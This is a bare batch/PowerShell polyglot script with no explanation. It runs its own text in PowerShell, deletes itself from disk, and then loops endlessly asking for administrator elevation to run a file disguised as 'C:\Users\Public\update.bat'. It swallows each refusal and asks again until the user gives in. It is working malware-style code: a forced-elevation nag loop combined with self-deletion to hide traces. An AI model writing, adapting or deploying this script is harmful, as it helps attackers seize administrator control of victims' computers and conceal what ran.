<# :
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
del "%~f0"
endlocal
goto:eof
#>
while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k C:\Users\Public\update.bat ';exit}catch{}}
